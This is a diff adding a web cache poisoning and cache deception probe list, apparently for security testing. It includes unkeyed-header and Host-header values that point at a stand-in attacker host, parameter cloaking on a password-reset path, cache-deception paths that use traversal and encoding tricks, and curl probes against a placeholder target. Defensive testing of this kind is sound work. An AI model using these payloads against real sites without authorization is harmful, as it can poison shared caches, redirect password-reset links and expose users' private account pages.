@@ -1,0 +1,34 @@
+# Unkeyed-header reflection probes (send with a unique marker, check if reflected + cached)
+X-Forwarded-Host: evil-cachepoison-marker.example
+X-Forwarded-Scheme: evil-cachepoison-marker
+X-Original-URL: /evil-cachepoison-marker
+X-Rewrite-URL: /evil-cachepoison-marker
+X-Host: evil-cachepoison-marker.example
+X-Forwarded-Server: evil-cachepoison-marker.example
+
+# Host header cache poisoning
+Host: evil-cachepoison-marker.example
+
+# Fat GET / parameter cloaking (duplicate param, backend vs cache may read different one)
+/reset-password?utm_content=evil-cachepoison-marker&utm_content=legit
+
+# Cache-buster for isolating responses during testing (append unique value per request)
+?cb=evil-cachepoison-marker-UNIQUE
+
+# Cache-deception probe paths (request while authenticated, re-check unauthenticated)
+/account/settings/nonexistent.css
+/my-profile/avatar/../settings.js
+/api/user/me%2e%2e%2fstatic.js
+
+# Headers to inspect in the response to confirm caching behavior
+Cache-Control
+Age
+X-Cache
+X-Cache-Hit
+CF-Cache-Status
+Vary
+Surrogate-Control
+
+# curl probes
+curl -s -D- -H "X-Forwarded-Host: evil-cachepoison-marker.example" https://TARGET_HOST/ | grep -i "evil-cachepoison-marker\|x-cache\|age:"
+curl -s -D- -o /dev/null https://TARGET_HOST/?cb=evil-cachepoison-marker-UNIQUE | grep -i "x-cache\|age:"
